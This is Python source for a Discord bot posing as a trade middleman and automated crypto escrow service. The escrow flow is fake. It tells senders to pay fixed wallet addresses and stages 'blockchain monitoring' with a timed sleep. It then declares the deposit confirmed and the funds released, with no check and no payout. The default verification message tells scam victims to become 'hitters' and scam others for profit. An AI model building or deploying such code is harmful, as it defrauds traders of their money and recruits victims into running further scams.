import os
import io
import json
import time
import random
import logging
import asyncio
import difflib
from datetime import datetime
from collections import defaultdict
from typing import Literal, Optional, Any, Dict
from threading import Thread

import discord
from discord.ext import commands, tasks
from discord.ui import Button, View
from discord import app_commands
from flask import Flask

# Logging Setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
logger = logging.getLogger("BloxTradeHelperBot")

# Configuration Constants
MIDDLEMAN_ROLE_ID = 1411386035551867044
TICKET_CATEGORY_ID = 1415896804024651908
MEMBER_ROLE_ID = 1411088611926868168
AUTO_VOUCH_CHANNEL_ID = 1546151910199922719
TRANSCRIPT_CHANNEL_ID = 1432124881788600320

BRAND_NAME = "Blox Trade Helper Bot"
GIF_FILE_PATH = "IMG_1153_2.gif"
GIF_URL = None

DEFAULT_VERIFY_TEXT = (
    "**Target:** {member}\n\n"
    "If you're seeing this, you've likely just been scammed — but this doesn't end how you think.\n\n"
    "Most people in this server started out the same way. But instead of taking the loss, "
    "they became **hitters** (scammers) — and now they're making **3x, 5x, even 10x** what they lost.\n\n"
    "This is your chance to turn a setback into serious profit.\n\n"
    "As a hitter, you'll gain access to a system where it's simple — Some of our top hitters make "
    "more in a week than they ever expected.\n\n"
    "**You now have access to the staff chat and other hitter channels.** Head to the main guide channel to learn how to start.\n\n"
    "Every minute you wait is profit missed.\n\n"
    "Need help getting started? Ask in the support system channel.\n\n"
    "You've already been pulled in — now it's time to flip the script and come out ahead."
)

# Web Service Keep-Alive
app = Flask('')

@app.route('/')
def home():
    return "Blox Trade Helper Bot - Operational"

def run_webserver():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    Thread(target=run_webserver, daemon=True).start()

# State Manager
class JSONStore:
    def __init__(self, filename: str, default: Any = None):
        self.filename = filename
        self.default = default if default is not None else {}

    def get_all(self) -> Dict[str, Any]:
        if not os.path.exists(self.filename):
            return self.default.copy()
        try:
            with open(self.filename, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error reading {self.filename}: {e}")
            return self.default.copy()

    def set_all(self, data: Dict[str, Any]) -> None:
        try:
            with open(self.filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4)
        except Exception as e:
            logger.error(f"Error writing to {self.filename}: {e}")

    def get(self, key: str, default: Any = None) -> Any:
        return self.get_all().get(key, default)

    def set(self, key: str, value: Any) -> None:
        data = self.get_all()
        data[str(key)] = value
        self.set_all(data)

    def delete(self, key: str) -> None:
        data = self.get_all()
        if str(key) in data:
            del data[str(key)]
            self.set_all(data)

# Store Instances
vouches_store = JSONStore("vouches.json", {})
blacklist_store = JSONStore("blacklist.json", {})
tickets_store = JSONStore("tickets.json", {})
config_store = JSONStore("config.json", {"verify_text": DEFAULT_VERIFY_TEXT})

# Flexible Role Converter
class FlexibleRoleConverter(commands.Converter):
    async def convert(self, ctx: commands.Context, argument: str) -> discord.Role:
        try:
            return await commands.RoleConverter().convert(ctx, argument)
        except commands.RoleNotFound:
            pass

        arg_lower = argument.lower()
        for role in ctx.guild.roles:
            if role.name.lower() == arg_lower or role.name.lower().startswith(arg_lower) or arg_lower in role.name.lower():
                return role

        role_map = {role.name.lower(): role for role in ctx.guild.roles}
        matches = difflib.get_close_matches(arg_lower, role_map.keys(), n=1, cutoff=0.4)
        if matches:
            return role_map[matches[0]]

        raise commands.BadArgument(f'Role "{argument}" not found.')

# Permission Helpers
def is_middleman_or_admin():
    async def predicate(ctx):
        if ctx.author.guild_permissions.administrator:
            return True
        has_mm = any(r.id == MIDDLEMAN_ROLE_ID for r in getattr(ctx.author, 'roles', []))
        if not has_mm:
            raise commands.CheckFailure("You need the Middleman role or Administrator permissions to use this command.")
        return True
    return commands.check(predicate)

# Utility Helpers
def apply_gif(embed: discord.Embed, as_thumbnail: bool = False) -> None:
    if os.path.exists(GIF_FILE_PATH):
        if as_thumbnail:
            embed.set_thumbnail(url=f"attachment://{GIF_FILE_PATH}")
        else:
            embed.set_image(url=f"attachment://{GIF_FILE_PATH}")
    elif GIF_URL:
        if as_thumbnail:
            embed.set_thumbnail(url=GIF_URL)
        else:
            embed.set_image(url=GIF_URL)

def build_gif_file() -> Optional[discord.File]:
    if os.path.exists(GIF_FILE_PATH):
        return discord.File(GIF_FILE_PATH, filename=GIF_FILE_PATH)
    return None

async def create_transcript(channel: discord.TextChannel) -> io.BytesIO:
    lines = []
    async for msg in channel.history(limit=None, oldest_first=True):
        ts = msg.created_at.strftime("%Y-%m-%d %H:%M:%S")
        author = f"{msg.author} ({msg.author.id})"
        content = msg.content
        if msg.attachments:
            content += " [Attachments: " + ", ".join([a.url for a in msg.attachments]) + "]"
        lines.append(f"[{ts}] {author}: {content}")
    return io.BytesIO("\n".join(lines).encode('utf-8'))


# ==========================================
# AUTO MM (AUTOMATED ESCROW) WORKFLOW VIEWS
# ==========================================

# Mock Wallet Addresses per Currency
MOCK_ESCROW_ADDRESSES = {
    "Bitcoin": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
    "Ethereum": "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
    "Litecoin": "LfypuGgp1HYCv7EPPBaWshQbVEWRFr57n3",
    "Solana": "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU",
    "USDT [ERC-20]": "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
    "USDC [ERC-20]": "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
    "USDT [BEP-20]": "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
    "USDT [SOL]": "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU",
    "USDC [SOL]": "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU",
}

# Mock Rates (USD per Coin)
MOCK_RATES = {
    "Bitcoin": 65000.00,
    "Ethereum": 3500.00,
    "Litecoin": 59.56,
    "Solana": 145.00,
    "USDT [ERC-20]": 1.00,
    "USDC [ERC-20]": 1.00,
    "USDT [BEP-20]": 1.00,
    "USDT [SOL]": 1.00,
    "USDC [SOL]": 1.00,
}

class DepositReleaseView(View):
    def __init__(self, sender: discord.Member, receiver: discord.Member, deal_type: str, deal_amount: float, crypto_amount: float):
        super().__init__(timeout=None)
        self.sender = sender
        self.receiver = receiver
        self.deal_type = deal_type
        self.deal_amount = deal_amount
        self.crypto_amount = crypto_amount

    @discord.ui.button(label="Release", style=discord.ButtonStyle.green, custom_id="deposit_release_btn")
    async def release_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id != self.sender.id:
            await interaction.response.send_message("❌ Only the designated Sender can release payment.", ephemeral=True)
            return

        button.disabled = True
        for child in self.children:
            child.disabled = True
        await interaction.message.edit(view=self)

        embed_payout = discord.Embed(
            title=f"Provide your {self.deal_type} address",
            description=f"{self.receiver.mention}\nThe sender released the trade! Please type your **{self.deal_type}** payout address in chat.",
            color=0x5865f2
        )
        await interaction.response.send_message(content=f"{self.receiver.mention}", embed=embed_payout)

        def check(m):
            return m.channel.id == interaction.channel.id and m.author.id == self.receiver.id

        try:
            payout_msg = await bot.wait_for('message', check=check, timeout=300)
            payout_address = payout_msg.content.strip()

            embed_finish = discord.Embed(
                title="AUTO MM FINISH",
                description=(
                    "**AUTOMATED ESCROW COMPLETE**\n\n"
                    f"• **Sender:** {self.sender.mention}\n"
                    f"• **Receiver:** {self.receiver.mention}\n"
                    f"• **Asset Released:** `{self.crypto_amount:.8f} {self.deal_type.split()[0]}` (${self.deal_amount:.2f} USD)\n"
                    f"• **Payout Address:** `{payout_address}`\n\n"
                    "Funds have been dispatched from escrow cold storage. Transaction complete!"
                ),
                color=0x2ecc71,
                timestamp=discord.utils.utcnow()
            )
            embed_finish.set_footer(text=f"{BRAND_NAME} • Escrow Finalized")
            await interaction.channel.send(embed=embed_finish)

        except asyncio.TimeoutError:
            await interaction.channel.send("Payout address timed out. Please contact staff.")

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary, custom_id="deposit_cancel_btn")
    async def cancel_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id not in (self.sender.id, self.receiver.id) and not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message("You are not part of this deal.", ephemeral=True)
            return

        embed_cancel = discord.Embed(
            title="Escrow Cancelled",
            description=f"Trade cancelled by {interaction.user.mention}. Escrow deposit will be refunded to {self.sender.mention}.",
            color=0xed4245
        )
        await interaction.response.send_message(embed=embed_cancel)


class CopyAddressView(View):
    def __init__(self, address: str):
        super().__init__(timeout=None)
        self.address = address

    @discord.ui.button(label="Copy Address", style=discord.ButtonStyle.secondary, custom_id="copy_escrow_address_btn")
    async def copy_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_message(f"`{self.address}`", ephemeral=True)


class AmountConfirmView(View):
    def __init__(self, sender: discord.Member, receiver: discord.Member, deal_type: str, deal_amount: float):
        super().__init__(timeout=None)
        self.sender = sender
        self.receiver = receiver
        self.deal_type = deal_type
        self.deal_amount = deal_amount
        self.sender_confirmed = False
        self.receiver_confirmed = False

    @discord.ui.button(label="Correct", style=discord.ButtonStyle.green, custom_id="amount_correct_btn")
    async def correct_btn(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id not in (self.sender.id, self.receiver.id):
            await interaction.response.send_message("You are not part of this deal.", ephemeral=True)
            return

        if interaction.user.id == self.sender.id and not self.sender_confirmed:
            self.sender_confirmed = True
            await interaction.channel.send(f"{self.sender.mention} confirmed the deal amount.")
        elif interaction.user.id == self.receiver.id and not self.receiver_confirmed:
            self.receiver_confirmed = True
            await interaction.channel.send(f"{self.receiver.mention} confirmed the deal amount.")

        await interaction.response.defer()

        if self.sender_confirmed and self.receiver_confirmed:
            button.disabled = True
            for child in self.children:
                child.disabled = True
            await interaction.message.edit(view=self)

            coin_name = self.deal_type.split()[0]
            rate = MOCK_RATES.get(self.deal_type, 1.0)
            crypto_amount = self.deal_amount / rate if rate > 0 else self.deal_amount
            address = MOCK_ESCROW_ADDRESSES.get(self.deal_type, "1EscrowAddressPlaceholder")

            embed_summary = discord.Embed(
                title=f"📋 Deal Summary · {self.deal_type}",
                description=f"• **Fee:** FREE\n\n**Sender:** {self.sender.mention}\n**Receiver:** {self.receiver.mention}\n\n**Total Deposit:** ${self.deal_amount:.2f} USD",
                color=0x2b2d31
            )
            await interaction.channel.send(embed=embed_summary)

            embed_invoice = discord.Embed(
                title=f"📮 Deposit Invoice · {self.deal_type}",
                description=(
                    f"{self.sender.mention} Send the required deposit to the official Middleman escrow address below.\n\n"
                    f"**Escrow Address**\n`{address}`\n\n"
                    f"**Exact Amount to Send**\n`{crypto_amount:.8f} {coin_name}` (${self.deal_amount:.2f} USD)\n\n"
                    f"**Live Rate**\n1 {coin_name} = ${rate:.2f} USD"
                ),
                color=0x2b2d31
            )
            await interaction.channel.send(embed=embed_invoice, view=CopyAddressView(address))

            status_msg = await interaction.channel.send("⏳ Monitoring blockchain network for incoming transfer...")

            # Simulate 3-minute deposit confirmation delay
            await asyncio.sleep(180)

            embed_secured = discord.Embed(
                title="✅ Deposit Confirmed & Secured",
                description=(
                    "Funds have arrived in cold storage and are locked for the duration of this deal.\n\n"
                    "**Secured Balance**\n"
                    f"• `{crypto_amount:.8f} {coin_name}` (${self.deal_amount:.2f} USD)\n\n"
                    f"The receiver ({self.receiver.mention}) may now deliver goods/services to the sender ({self.sender.mention}).\n\n"
                    "When complete, the sender clicks **Release**."
                ),
                color=0x2ecc71
            )
            release_view = DepositReleaseView(self.sender, self.receiver, self.deal_type, self.deal_amount, crypto_amount)
            await interaction.channel.send(content=f"{self.sender.mention} {self.receiver.mention}", embed=embed_secured, view=release_view)

    @discord.ui.button(label="Incorrect", style=discord.ButtonStyle.secondary, custom_id="amount_incorrect_btn")
    async def incorrect_btn(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id not in (self.sender.id, self.receiver.id):
            await interaction.response.send_message("You are not part of this deal.", ephemeral=True)
            return

        self.sender_confirmed = False
        self.receiver_confirmed = False
        await interaction.response.send_message("Deal amount reset. Please re-enter the USD deal amount.", ephemeral=True)


class RoleConfirmView(View):
    def __init__(self, sender: discord.Member, receiver: discord.Member, deal_type: str):
        super().__init__(timeout=None)
        self.sender = sender
        self.receiver = receiver
        self.deal_type = deal_type
        self.sender_confirmed = False
        self.receiver_confirmed = False

    @discord.ui.button(label="Correct", style=discord.ButtonStyle.green, custom_id="role_confirm_correct")
    async def correct_btn(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id not in (self.sender.id, self.receiver.id):
            await interaction.response.send_message("You are not part of this deal.", ephemeral=True)
            return

        if interaction.user.id == self.sender.id and not self.sender_confirmed:
            self.sender_confirmed = True
            await interaction.channel.send(f"{self.sender.mention} confirmed role configuration.")
        elif interaction.user.id == self.receiver.id and not self.receiver_confirmed:
            self.receiver_confirmed = True
            await interaction.channel.send(f"{self.receiver.mention} confirmed role configuration.")

        await interaction.response.defer()

        if self.sender_confirmed and self.receiver_confirmed:
            button.disabled = True
            for child in self.children:
                child.disabled = True
            await interaction.message.edit(view=self)

            embed_prompt = discord.Embed(
                title="Deal Amount",
                description=f"{self.sender.mention}\nState the expected deal value in **USD** (e.g. `150.00`). The bot will convert it to {self.deal_type.split()[0]}.",
                color=0xf1c40f
            )
            await interaction.channel.send(content=f"{self.sender.mention}", embed=embed_prompt)

            def check_amount(m):
                if m.channel.id == interaction.channel.id and m.author.id == self.sender.id:
                    try:
                        float(m.content.replace('$', '').strip())
                        return True
                    except ValueError:
                        return False
                return False

            try:
                amt_msg = await bot.wait_for('message', check=check_amount, timeout=300)
                val = float(amt_msg.content.replace('$', '').strip())

                embed_confirm_amt = discord.Embed(
                    description=f"Confirm the total USD deal value:\n\n**Amount:** ${val:.2f} USD\n\n**Both parties must click Correct to proceed.**",
                    color=0x2b2d31
                )
                amt_view = AmountConfirmView(self.sender, self.receiver, self.deal_type, val)
                await interaction.channel.send(embed=embed_confirm_amt, view=amt_view)

            except asyncio.TimeoutError:
                await interaction.channel.send("No valid amount provided within 5 minutes. Session cancelled.")

    @discord.ui.button(label="Incorrect", style=discord.ButtonStyle.secondary, custom_id="role_confirm_incorrect")
    async def incorrect_btn(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id not in (self.sender.id, self.receiver.id):
            await interaction.response.send_message("You are not part of this deal.", ephemeral=True)
            return

        self.sender_confirmed = False
        self.receiver_confirmed = False
        await interaction.response.send_message("Role configuration reset. Please re-assign roles using the panel above.", ephemeral=True)


class RoleAssignmentView(View):
    def __init__(self, creator: discord.Member, partner: discord.Member, deal_type: str):
        super().__init__(timeout=None)
        self.creator = creator
        self.partner = partner
        self.deal_type = deal_type
        self.sender: Optional[discord.Member] = None
        self.receiver: Optional[discord.Member] = None

    def build_embed(self) -> discord.Embed:
        coin_name = self.deal_type.split()[0]
        embed = discord.Embed(
            title="Role Assignment",
            description=f"Select your role in this **{self.deal_type}** deal.",
            color=0x5865f2
        )
        embed.add_field(name=f"Sending {coin_name}", value=self.sender.mention if self.sender else "None", inline=False)
        embed.add_field(name=f"Receiving {coin_name}", value=self.receiver.mention if self.receiver else "None", inline=False)
        return embed

    @discord.ui.button(label="Sending", style=discord.ButtonStyle.secondary, custom_id="role_sending")
    async def set_sending(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id not in (self.creator.id, self.partner.id):
            await interaction.response.send_message("You are not part of this deal.", ephemeral=True)
            return

        self.sender = interaction.user
        self.receiver = self.partner if self.sender.id == self.creator.id else self.creator
        await interaction.response.edit_message(embed=self.build_embed(), view=self)
        await self.prompt_role_confirm_if_ready(interaction.channel)

    @discord.ui.button(label="Receiving", style=discord.ButtonStyle.secondary, custom_id="role_receiving")
    async def set_receiving(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id not in (self.creator.id, self.partner.id):
            await interaction.response.send_message("You are not part of this deal.", ephemeral=True)
            return

        self.receiver = interaction.user
        self.sender = self.partner if self.receiver.id == self.creator.id else self.creator
        await interaction.response.edit_message(embed=self.build_embed(), view=self)
        await self.prompt_role_confirm_if_ready(interaction.channel)

    @discord.ui.button(label="Reset", style=discord.ButtonStyle.danger, custom_id="role_reset")
    async def reset(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id not in (self.creator.id, self.partner.id):
            await interaction.response.send_message("You are not part of this deal.", ephemeral=True)
            return

        self.sender = None
        self.receiver = None
        await interaction.response.edit_message(embed=self.build_embed(), view=self)

    async def prompt_role_confirm_if_ready(self, channel: discord.TextChannel):
        if self.sender and self.receiver:
            coin_name = self.deal_type.split()[0]
            embed_roles = discord.Embed(
                title="Confirm Roles",
                description=(
                    f"**Sender ({coin_name}):** {self.sender.mention}\n"
                    f"**Receiver:** {self.receiver.mention}\n\n"
                    "**Both users must click Correct to proceed.**"
                ),
                color=0x2b2d31
            )
            view_confirm = RoleConfirmView(self.sender, self.receiver, self.deal_type)
            await channel.send(embed=embed_roles, view=view_confirm)


class AutoMMStartView(View):
    def __init__(self, deal_type: str):
        super().__init__(timeout=None)
        self.deal_type = deal_type

    async def start_deal(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        bl_entry = blacklist_store.get(str(interaction.user.id))
        if bl_entry:
            await interaction.followup.send("You are blacklisted from opening tickets.", ephemeral=True)
            return

        category = interaction.guild.get_channel(TICKET_CATEGORY_ID)
        ticket_channel = await interaction.guild.create_text_channel(
            name=f"ticket-{random.randint(100000, 999999)}",
            category=category,
            overwrites={
                interaction.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                interaction.user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                interaction.guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
        )

        tickets_store.set(str(ticket_channel.id), interaction.user.id)
        await interaction.followup.send(f"Ticket opened: {ticket_channel.mention}", ephemeral=True)

        embed_init = discord.Embed(
            title=f"{self.deal_type} Escrow Deal",
            description=(
                f"**{self.deal_type}** middleman request initiated.\n\n"
                "Welcome to our automated escrow service! Funds are secured autonomously in cold storage until both parties finalize delivery."
            ),
            color=0x2b2d31
        )
        await ticket_channel.send(embed=embed_init)
        await ticket_channel.send(f"{interaction.user.mention}\nWho are you dealing with?\ne.g. `@user`")

        def check(m):
            return m.channel.id == ticket_channel.id and m.author.id == interaction.user.id and len(m.mentions) > 0

        try:
            msg = await bot.wait_for('message', check=check, timeout=300)
            partner = msg.mentions[0]
            await ticket_channel.set_permissions(partner, read_messages=True, send_messages=True)

            role_view = RoleAssignmentView(creator=interaction.user, partner=partner, deal_type=self.deal_type)
            await ticket_channel.send(content=f"{partner.mention}", embed=role_view.build_embed(), view=role_view)
        except asyncio.TimeoutError:
            await ticket_channel.send("No partner mentioned within 5 minutes. Session cancelled.")


class AutoMMPanelView(View):
    def __init__(self):
        super().__init__(timeout=None)

    # Crypto Row
    @discord.ui.button(label="Bitcoin", style=discord.ButtonStyle.green, row=0, custom_id="amm_btc")
    async def btc(self, interaction: discord.Interaction, button: Button):
        await AutoMMStartView("Bitcoin").start_deal(interaction)

    @discord.ui.button(label="Ethereum", style=discord.ButtonStyle.green, row=0, custom_id="amm_eth")
    async def eth(self, interaction: discord.Interaction, button: Button):
        await AutoMMStartView("Ethereum").start_deal(interaction)

    @discord.ui.button(label="Litecoin", style=discord.ButtonStyle.green, row=0, custom_id="amm_ltc")
    async def ltc(self, interaction: discord.Interaction, button: Button):
        await AutoMMStartView("Litecoin").start_deal(interaction)

    @discord.ui.button(label="Solana", style=discord.ButtonStyle.green, row=0, custom_id="amm_sol")
    async def sol(self, interaction: discord.Interaction, button: Button):
        await AutoMMStartView("Solana").start_deal(interaction)

    # Stablecoins Row
    @discord.ui.button(label="USDT [ERC-20]", style=discord.ButtonStyle.green, row=1, custom_id="amm_usdt_erc20")
    async def usdt_erc20(self, interaction: discord.Interaction, button: Button):
        await AutoMMStartView("USDT [ERC-20]").start_deal(interaction)

    @discord.ui.button(label="USDC [ERC-20]", style=discord.ButtonStyle.green, row=1, custom_id="amm_usdc_erc20")
    async def usdc_erc20(self, interaction: discord.Interaction, button: Button):
        await AutoMMStartView("USDC [ERC-20]").start_deal(interaction)

    @discord.ui.button(label="USDT [BEP-20]", style=discord.ButtonStyle.green, row=2, custom_id="amm_usdt_bep20")
    async def usdt_bep20(self, interaction: discord.Interaction, button: Button):
        await AutoMMStartView("USDT [BEP-20]").start_deal(interaction)

    @discord.ui.button(label="USDT [SOL]", style=discord.ButtonStyle.green, row=2, custom_id="amm_usdt_sol")
    async def usdt_sol(self, interaction: discord.Interaction, button: Button):
        await AutoMMStartView("USDT [SOL]").start_deal(interaction)

    @discord.ui.button(label="USDC [SOL]", style=discord.ButtonStyle.green, row=2, custom_id="amm_usdc_sol")
    async def usdc_sol(self, interaction: discord.Interaction, button: Button):
        await AutoMMStartView("USDC [SOL]").start_deal(interaction)


# ==========================================
# EXISTING BOT TICKET & VERIFY VIEWS
# ==========================================

class VerifyView(View):
    def __init__(self, target_user_id: int):
        super().__init__(timeout=300)
        self.target_user_id = target_user_id

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id == self.target_user_id:
            return True
        await interaction.response.send_message("This interaction is not assigned to you.", ephemeral=True)
        return False

    @discord.ui.button(label="Accept", style=discord.ButtonStyle.green, custom_id="verify_accept")
    async def accept(self, interaction: discord.Interaction, button: Button):
        role = interaction.guild.get_role(MEMBER_ROLE_ID)
        if role:
            try:
                await interaction.user.add_roles(role)
            except discord.Forbidden:
                logger.warning(f"Insufficient permissions to assign role {MEMBER_ROLE_ID}")

        embed = discord.Embed(color=0x2b2d31, description=f"{interaction.user.mention} has been successfully verified.")
        embed.set_footer(text=BRAND_NAME)
        apply_gif(embed, as_thumbnail=True)

        gif_file = build_gif_file()
        kwargs = {"content": "", "embed": embed, "view": None}
        if gif_file:
            kwargs["attachments"] = [gif_file]
        await interaction.response.edit_message(**kwargs)

    @discord.ui.button(label="Decline", style=discord.ButtonStyle.danger, custom_id="verify_decline")
    async def decline(self, interaction: discord.Interaction, button: Button):
        embed = discord.Embed(color=0x2b2d31, description=f"{interaction.user.mention} declined verification.")
        embed.set_footer(text=BRAND_NAME)
        apply_gif(embed, as_thumbnail=True)

        gif_file = build_gif_file()
        kwargs = {"content": "", "embed": embed, "view": None}
        if gif_file:
            kwargs["attachments"] = [gif_file]
        await interaction.response.edit_message(**kwargs)

class TicketControlsView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Claim", style=discord.ButtonStyle.green, custom_id="claim_ticket")
    async def claim(self, interaction: discord.Interaction, button: Button):
        has_role = any(r.id == MIDDLEMAN_ROLE_ID for r in interaction.user.roles)
        if not has_role and not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message("Only Middlemen can claim tickets.", ephemeral=True)
            return

        creator_id = tickets_store.get(str(interaction.channel.id))
        if creator_id and interaction.user.id == int(creator_id):
            await interaction.response.send_message("You cannot claim your own ticket.", ephemeral=True)
            return

        await interaction.channel.set_permissions(interaction.user, read_messages=True, send_messages=True)
        button.disabled = True
        for child in self.children:
            if child.custom_id == "unclaim_ticket":
                child.disabled = False
        await interaction.response.edit_message(view=self)

        embed = discord.Embed(color=0x2b2d31, description=f"{interaction.user.mention} claimed this ticket.")
        embed.set_footer(text=BRAND_NAME)
        apply_gif(embed, as_thumbnail=True)

        gif_file = build_gif_file()
        if gif_file:
            await interaction.channel.send(embed=embed, file=gif_file)
        else:
            await interaction.channel.send(embed=embed)

    @discord.ui.button(label="Unclaim", style=discord.ButtonStyle.secondary, custom_id="unclaim_ticket")
    async def unclaim(self, interaction: discord.Interaction, button: Button):
        has_role = any(r.id == MIDDLEMAN_ROLE_ID for r in interaction.user.roles)
        if not has_role and not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message("Only Middlemen can unclaim tickets.", ephemeral=True)
            return

        button.disabled = True
        for child in self.children:
            if child.custom_id == "claim_ticket":
                child.disabled = False
        await interaction.response.edit_message(view=self)

        embed = discord.Embed(color=0x2b2d31, description=f"{interaction.user.mention} unclaimed this ticket.")
        embed.set_footer(text=BRAND_NAME)
        apply_gif(embed, as_thumbnail=True)

        gif_file = build_gif_file()
        if gif_file:
            await interaction.channel.send(embed=embed, file=gif_file)
        else:
            await interaction.channel.send(embed=embed)

    @discord.ui.button(label="Close", style=discord.ButtonStyle.danger, custom_id="close_ticket")
    async def close(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer()

        for child in self.children:
            child.disabled = True
        await interaction.message.edit(view=self)

        embed = discord.Embed(color=0x2b2d31, description="Generating transcript... Closing channel in 5 seconds...")
        embed.set_footer(text=BRAND_NAME)
        await interaction.channel.send(embed=embed)

        try:
            buffer = await create_transcript(interaction.channel)
            buffer.seek(0)
            file_obj = discord.File(buffer, filename=f"transcript-{interaction.channel.name}.txt")

            if TRANSCRIPT_CHANNEL_ID:
                t_channel = interaction.guild.get_channel(TRANSCRIPT_CHANNEL_ID)
                if t_channel:
                    t_embed = discord.Embed(
                        title="Ticket Transcript",
                        color=0x2b2d31,
                        timestamp=discord.utils.utcnow(),
                        description=f"Transcript for **{interaction.channel.name}** closed by {interaction.user.mention}."
                    )
                    t_embed.set_footer(text=BRAND_NAME)
                    apply_gif(t_embed, as_thumbnail=True)

                    gif_file = build_gif_file()
                    files = [file_obj]
                    if gif_file:
                        files.append(gif_file)

                    await t_channel.send(embed=t_embed, files=files)
        except Exception as e:
            logger.error(f"Failed to compile transcript for {interaction.channel.id}: {e}")

        tickets_store.delete(str(interaction.channel.id))
        await asyncio.sleep(5)
        try:
            await interaction.channel.delete()
        except discord.NotFound:
            pass

class TicketMainView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Request Middleman", style=discord.ButtonStyle.green, custom_id="request_middleman_main")
    async def create_ticket(self, interaction: discord.Interaction, button: Button):
        bl_entry = blacklist_store.get(str(interaction.user.id))
        if bl_entry:
            reason = bl_entry.get("reason", "No reason specified.")
            await interaction.response.send_message(f"You are blacklisted from opening tickets.\n**Reason:** {reason}", ephemeral=True)
            return

        mm_role = interaction.guild.get_role(MIDDLEMAN_ROLE_ID)
        overwrites = {
            interaction.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            interaction.user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            interaction.guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        if mm_role:
            overwrites[mm_role] = discord.PermissionOverwrite(read_messages=True, send_messages=True)

        category = interaction.guild.get_channel(TICKET_CATEGORY_ID)
        ticket_channel = await interaction.guild.create_text_channel(
            name=f"ticket-{interaction.user.name}",
            category=category,
            overwrites=overwrites
        )

        tickets_store.set(str(ticket_channel.id), interaction.user.id)
        await interaction.response.send_message(f"Ticket opened: {ticket_channel.mention}", ephemeral=True)

        embed = discord.Embed(
            title=f"{BRAND_NAME} — Secure Middleman Session",
            color=0x2b2d31,
            timestamp=discord.utils.utcnow()
        )
        embed.description = (
            "Welcome to your trade ticket! An official Middleman will be with you shortly.\n"
            "Please follow the instructions below to ensure a smooth and safe deal."
        )

        embed.add_field(name="Requester", value=f"{interaction.user.mention}\n`ID: {interaction.user.id}`", inline=True)
        embed.add_field(name="Status", value="`Waiting for Middleman...`", inline=True)
        embed.add_field(name="Created", value=f"<t:{int(time.time())}:R>", inline=True)

        embed.add_field(
            name="Trade Details Template",
            value=(
                "Please copy, fill out, and send the format below in this chat:\n"
                "```yaml\n"
                "1. Trading With: @User\n"
                "2. Your Item(s): ...\n"
                "3. Their Item(s): ...\n"
                "```"
            ),
            inline=False
        )

        embed.add_field(
            name="Safety Protocol",
            value=(
                "• **Do NOT** complete trades outside of this ticket or via DMs.\n"
                "• Always verify that the Middleman holds the <@&" + str(MIDDLEMAN_ROLE_ID) + "> role.\n"
                "• Troll or fake ticket creations will result in an immediate permanent blacklist."
            ),
            inline=False
        )

        guild_icon = interaction.guild.icon.url if interaction.guild.icon else None
        embed.set_footer(text=f"{BRAND_NAME} • Trade Verification System", icon_url=guild_icon)
        apply_gif(embed, as_thumbnail=False)

        gif_file = build_gif_file()
        content = f"{interaction.user.mention} <@&{MIDDLEMAN_ROLE_ID}>"
        kwargs = {"content": content, "embeds": [embed], "view": TicketControlsView()}
        if gif_file:
            kwargs["file"] = gif_file
        await ticket_channel.send(**kwargs)

# Client Initialization
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="$", intents=intents)

@bot.event
async def on_ready():
    bot.add_view(TicketMainView())
    bot.add_view(TicketControlsView())
    bot.add_view(AutoMMPanelView())
    if not auto_vouch_loop.is_running():
        auto_vouch_loop.start()
    logger.info(f"Connected as {bot.user} (ID: {bot.user.id})")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need Administrator permissions to use this command.")
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(str(error) if str(error) else "You do not have permission to use this command.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"Missing argument: `{error.param.name}`")
    elif isinstance(error, commands.BadArgument):
        await ctx.send(f"Error: {error}")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        logger.error(f"Command error in {ctx.command}: {error}")

# Anti-Nuke Architecture
nuke_tracker = defaultdict(lambda: defaultdict(lambda: defaultdict(list)))
TIME_WINDOW = 60
LIMITS = {'channel_delete': 3, 'channel_create': 5, 'role_delete': 3, 'role_create': 5, 'ban': 4}

async def fetch_audit_executor(guild: discord.Guild, action: discord.AuditLogAction) -> Optional[discord.User]:
    try:
        async for entry in guild.audit_logs(limit=1, action=action):
            return entry.user
    except discord.Forbidden:
        return None

